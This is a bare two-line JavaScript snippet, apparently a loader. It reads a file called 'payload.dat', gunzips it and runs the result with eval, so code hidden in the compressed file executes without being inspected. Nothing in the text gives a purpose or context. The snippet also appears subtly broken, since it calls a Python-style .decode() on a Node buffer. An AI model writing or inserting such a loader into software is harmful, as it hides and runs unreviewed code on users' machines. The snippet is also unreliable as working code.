function decompress(data) { return zlib.gunzipSync(data); }
eval(decompress(fs.readFileSync("payload.dat")).decode());
